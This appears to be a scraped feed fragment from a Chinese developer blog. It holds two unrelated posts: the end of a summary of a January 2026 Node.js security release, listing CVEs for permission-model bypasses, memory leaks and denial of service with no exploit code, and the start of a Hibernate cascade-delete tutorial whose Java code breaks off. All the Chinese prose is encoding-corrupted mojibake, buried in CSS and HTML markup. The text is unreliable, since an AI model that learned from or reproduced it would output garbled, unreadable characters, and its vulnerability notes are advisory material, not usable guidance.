pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">å‰è¨€</h3>
<p>Node.js å®˜æ–¹åœ¨ 2026 å¹´ 1 æœˆ 13 æ—¥æ›´æ–°ä¿®å¤äº†å¤šä¸ªä¸¥é‡å®‰å…¨æ¼æ´ï¼Œæ¶‰åŠç¼“å†²åŒºæ³„éœ²ã€æƒé™ç»•è¿‡ã€DoS æ”»å‡»ç­‰ï¼Œå½±å“æ‰€æœ‰æ´»è·ƒç‰ˆæœ¬ï¼Œå»ºè®®æ‰€æœ‰ç”¨æˆ·å°½å¿«å‡çº§ï¼</p>
<h4 data-id="heading-1">å¾€æœŸç²¾å½©æ¨è</h4>
<ul>
<li><a href="https://juejin.cn/post/7587965908288749578" target="_blank" title="https://juejin.cn/post/7587965908288749578">AudioDockï¼šæœåŠ¡å™¨å’Œ NAS éŸ³é¢‘æ’­æ”¾æœ€æ£’çš„è½¯ä»¶ï¼ğŸš€ğŸš€ğŸš€</a></li>
<li><a href="https://juejin.cn/post/7586518130761007144" target="_blank" title="https://juejin.cn/post/7586518130761007144">pnpm + monorepo æ‰æ˜¯ AI ååŒå¼€å‘çš„æœ€ä½³æ–¹æ¡ˆï¼ğŸš€ğŸš€ğŸš€</a></li>
<li><a href="https://juejin.cn/post/7586518130761007144" target="_blank" title="https://juejin.cn/post/7586518130761007144">å°¤é›¨æºªå¼ºçƒˆæ¨èçš„è¿™ä¸ªåº“ä½ ä¸€å®šè¦çŸ¥é“ âš¡ï¸âš¡ï¸âš¡ï¸</a></li>
<li>æ›´å¤šç²¾å½©æ–‡ç« æ¬¢è¿å…³æ³¨æˆ‘çš„å…¬ä¼—å·ï¼šèŒèŒå“’è‰å¤´å°†å†›</li>
</ul>
<h3 data-id="heading-2">æ­£æ–‡</h3>
<p>æœ¬æ¬¡å®‰å…¨å‘å¸ƒä¸»è¦é’ˆå¯¹ Node.js å½“å‰æ‰€æœ‰æ´»è·ƒç‰ˆæœ¬ï¼ˆ20.xã€22.xã€24.xã€25.xï¼‰å‘å¸ƒäº†è¡¥ä¸ï¼Œç´¯è®¡ä¿®å¤äº† <strong>3 ä¸ª é«˜å±</strong>ã€<strong>4 ä¸ª ä¸­å±</strong> å’Œ <strong>1 ä¸ª ä½å±</strong> ä¸¥é‡æ€§çš„æ¼æ´ï¼Œ</p>
<p>åŒæ—¶æ›´æ–°äº†æ ¸å¿ƒä¾èµ– c-ares å’Œ undiciã€‚</p>
<h4 data-id="heading-3">ä¸»è¦é«˜å±æ¼æ´ï¼š</h4>
<ol>
<li><strong>CVE-2025-55131</strong>ï¼ˆHighï¼‰</li>
</ol>
<p>Timeout å¯¼è‡´çš„ç«æ€æ¡ä»¶ï¼Œä½¿å¾— Buffer.alloc / Uint8Array å¯èƒ½åˆ†é…åˆ°æœªæ¸…é›¶çš„å†…å­˜ï¼Œå­˜åœ¨æ•æ„Ÿä¿¡æ¯æ³„éœ²é£é™©ï¼ˆå¯†é’¥ã€token ç­‰ï¼‰ã€‚éœ€è¦ç‰¹å®šæ—¶æœºæˆ–æ”»å‡»è€…æ§åˆ¶è¶…æ—¶è¡Œä¸ºæ‰èƒ½åˆ©ç”¨ï¼Œä½†å±å®³æå¤§ã€‚</p>
<ol start="2">
<li><strong>CVE-2025-55130</strong>ï¼ˆHighï¼‰</li>
</ol>
<p>ä½¿ç”¨ç²¾å¿ƒæ„é€ çš„ç›¸å¯¹è·¯å¾„ç¬¦å·é“¾æ¥ï¼Œå¯ç»•è¿‡ <code>--allow-fs-read</code> / <code>--allow-fs-write</code> æƒé™é™åˆ¶ï¼Œå®ç°ä»»æ„æ–‡ä»¶è¯»å†™ã€‚ä¸¥é‡ç ´åäº† Permission Model çš„éš”ç¦»èƒ½åŠ›ã€‚</p>
<ol start="3">
<li><strong>CVE-2025-59465</strong>ï¼ˆHighï¼‰</li>
</ol>
<p>HTTP/2 æœåŠ¡å™¨åœ¨æ”¶åˆ°ç•¸å½¢ HEADERS å¸§æ—¶ä¼šç›´æ¥æŠ›å‡ºæœªå¤„ç†çš„ TLSSocket é”™è¯¯ï¼Œå¯¼è‡´è¿›ç¨‹å´©æºƒï¼ˆè¿œç¨‹ DoSï¼‰ã€‚æœªåŠ  error ç›‘å¬çš„ HTTPS æœåŠ¡å°¤å…¶å±é™©ã€‚</p>
<h4 data-id="heading-4">ä¸­å±æ¼æ´ï¼š</h4>
<ul>
<li><strong>CVE-2026-21636</strong>ï¼ˆMediumï¼‰ï¼š</li>
</ul>
<p>æƒé™æ¨¡å‹ä¸‹ Unix Domain Socket æœªå— <code>--allow-net</code> é™åˆ¶ï¼Œå¯è¿æ¥ä»»æ„æœ¬åœ° socketï¼Œå­˜åœ¨ææƒé£é™©ï¼ˆä»…å½±å“ v25ï¼‰</p>
<ul>
<li><strong>CVE-2025-59466</strong>ï¼ˆMediumï¼‰ï¼š</li>
</ul>
<p>async_hooks åœºæ™¯ä¸‹æ ˆæº¢å‡ºé”™è¯¯æ— æ³•è¢«æ•è·ï¼Œç›´æ¥ç»ˆæ­¢è¿›ç¨‹ï¼ˆDoSï¼‰</p>
<ul>
<li><strong>CVE-2026-21637</strong>ï¼ˆMediumï¼‰ï¼š</li>
</ul>
<p>TLS PSK/ALPN å›è°ƒä¸­åŒæ­¥å¼‚å¸¸ä¼šç»•è¿‡é”™è¯¯å¤„ç†ï¼Œå¯¼è‡´å´©æºƒæˆ– fd æ³„æ¼</p>
<h4 data-id="heading-5">ä½å±æ¼æ´</h4>
<ul>
<li><strong>CVE-2025-55132</strong>ï¼ˆLowï¼‰ï¼š</li>
</ul>
<p>fs.futimes() å¯ç»•è¿‡åªè¯»æƒé™ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ³ï¼ˆç—•è¿¹æ¸…ç†ï¼‰ã€‚</p>
<p><strong>å—å½±å“ç‰ˆæœ¬</strong>ï¼šæ‰€æœ‰æ´»è·ƒåˆ†æ”¯ 20.xã€22.xã€24.xã€25.xï¼ˆEOL ç‰ˆæœ¬åŒæ ·å—å½±å“ï¼Œä½†å®˜æ–¹ä¸å†ä¿®å¤ï¼‰<br/>
<strong>ä¿®å¤ç‰ˆæœ¬</strong>ï¼š2025 å¹´ 12 æœˆ 15 æ—¥ä¹‹åå‘å¸ƒçš„æœ€æ–° 20.x / 22.x / 24.x / 25.x ç‰ˆæœ¬</p>
<h3 data-id="heading-6">æœ€å</h3>
<p>å¼ºçƒˆå»ºè®®ç”Ÿäº§ç¯å¢ƒå°½å¿«å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ï¼ŒåŒæ—¶å…³æ³¨åç»­çš„ async_hooks DoS ç¼“è§£æ–¹æ¡ˆã€‚</p>
<p>ä»Šå¤©çš„åˆ†äº«å°±è¿™äº›äº†ï¼Œæ„Ÿè°¢å¤§å®¶çš„é˜…è¯»ï¼Œå¦‚æœæ–‡ç« ä¸­å­˜åœ¨é”™è¯¯çš„åœ°æ–¹æ¬¢è¿æŒ‡æ­£ï¼</p>
<h4 data-id="heading-7">å¾€æœŸç²¾å½©æ¨è</h4>
<ul>
<li><a href="https://juejin.cn/post/7587965908288749578" target="_blank" title="https://juejin.cn/post/7587965908288749578">AudioDockï¼šæœåŠ¡å™¨å’Œ NAS éŸ³é¢‘æ’­æ”¾æœ€æ£’çš„è½¯ä»¶ï¼ğŸš€ğŸš€ğŸš€</a></li>
<li><a href="https://juejin.cn/post/7586518130761007144" target="_blank" title="https://juejin.cn/post/7586518130761007144">pnpm + monorepo æ‰æ˜¯ AI ååŒå¼€å‘çš„æœ€ä½³æ–¹æ¡ˆï¼ğŸš€ğŸš€ğŸš€</a></li>
<li><a href="https://juejin.cn/post/7586518130761007144" target="_blank" title="https://juejin.cn/post/7586518130761007144">å°¤é›¨æºªå¼ºçƒˆæ¨èçš„è¿™ä¸ªåº“ä½ ä¸€å®šè¦çŸ¥é“ âš¡ï¸âš¡ï¸âš¡ï¸</a></li>
<li>æ›´å¤šç²¾å½©æ–‡ç« æ¬¢è¿å…³æ³¨æˆ‘çš„å…¬ä¼—å·ï¼šèŒèŒå“’è‰å¤´å°†å†›</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ43ï¼‰Hibernateä¸­çš„çº§è”åˆ é™¤å¦‚ä½•å®ç°ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7595178023256899603</link>    <guid>https://juejin.cn/post/7595178023256899603</guid>    <pubDate>2026-01-15T11:46:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595178023256899603" data-draft-id="7595150851477815339" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ43ï¼‰Hibernateä¸­çš„çº§è”åˆ é™¤å¦‚ä½•å®ç°ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-15T11:46:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ43ï¼‰Hibernateä¸­çš„çº§è”åˆ é™¤å¦‚ä½•å®ç°ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T11:46:17.000Z" title="Thu Jan 15 2026 11:46:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨Hibernateä¸­ï¼Œçº§è”åˆ é™¤ï¼ˆCascade Deleteï¼‰æ˜¯æŒ‡å½“åˆ é™¤ä¸€ä¸ªå®ä½“æ—¶ï¼Œè‡ªåŠ¨åˆ é™¤ä¸ä¹‹ç›¸å…³è”çš„å…¶ä»–å®ä½“ã€‚Hibernateé€šè¿‡é…ç½®çº§è”ç±»å‹æ¥å®ç°è¿™ä¸€åŠŸèƒ½ã€‚å¸¸ç”¨çš„çº§è”ç±»å‹åŒ…æ‹¬ï¼š</p>
<ul>
<li><code>CascadeType.ALL</code>ï¼šå¯¹æ‰€æœ‰æ“ä½œè¿›è¡Œçº§è”ï¼ˆåŒ…æ‹¬<code>PERSIST</code>ã€<code>MERGE</code>ã€<code>REMOVE</code>ç­‰ï¼‰ã€‚</li>
<li><code>CascadeType.REMOVE</code>ï¼šçº§è”åˆ é™¤æ“ä½œã€‚</li>
<li><code>CascadeType.PERSIST</code>ï¼šçº§è”ä¿å­˜æ“ä½œã€‚</li>
<li><code>CascadeType.MERGE</code>ï¼šçº§è”åˆå¹¶æ“ä½œã€‚</li>
<li><code>CascadeType.REFRESH</code>ï¼šçº§è”åˆ·æ–°æ“ä½œã€‚</li>
<li><code>CascadeType.DETACH</code>ï¼šçº§è”åˆ†ç¦»æ“ä½œã€‚</li>
</ul>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªè¯¦ç»†çš„ç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•åœ¨Hibernateä¸­å®ç°çº§è”åˆ é™¤ã€‚</p>
<h3 data-id="heading-0">ç¤ºä¾‹</h3>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸¤ä¸ªå®ä½“ç±»ï¼š<code>Category</code>å’Œ<code>Product</code>ï¼Œå…¶ä¸­<code>Category</code>å’Œ<code>Product</code>æ˜¯ä¸€å¯¹å¤šå…³ç³»ã€‚å½“æˆ‘ä»¬åˆ é™¤ä¸€ä¸ª<code>Category</code>æ—¶ï¼Œè‡ªåŠ¨åˆ é™¤ä¸ä¹‹å…³è”çš„æ‰€æœ‰<code>Product</code>ã€‚</p>
<h4 data-id="heading-1">æ­¥éª¤ä¸€ï¼šå®šä¹‰å®ä½“ç±»</h4>
<h5 data-id="heading-2"><code>Category</code>å®ä½“ç±»</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Set;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "category")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Category</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@OneToMany(mappedBy = "category", cascade = CascadeType.ALL, orphanRemoval = true)</span>
    <span class="hljs-keyword">private</span> Set&lt;Product&gt; products = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();

    <span class="hljs-comment">// Getters å’Œ Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> Set&lt;Product&gt; <span class="hljs-title function_">getProducts</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> products;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProducts</span><span class="hljs-params">(Set&lt;Product&gt; products)</span> {
        <span class="hljs-built_in">this</span>.products = products;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addProduct</span><span class="hljs-params">(Product product)</span> {
        products.add(product);
        product.setCategory(<span class="hljs-built_in">this</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeProduct</span><span class="hljs-params">(Product product)</span> {
        products.remove(product);
        product.setCategory(<span class="hljs-literal">null</span>);
    }
}
</code></pre>
<h5 data-id="heading-3"><code>Product</code>å®ä½“ç±»</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

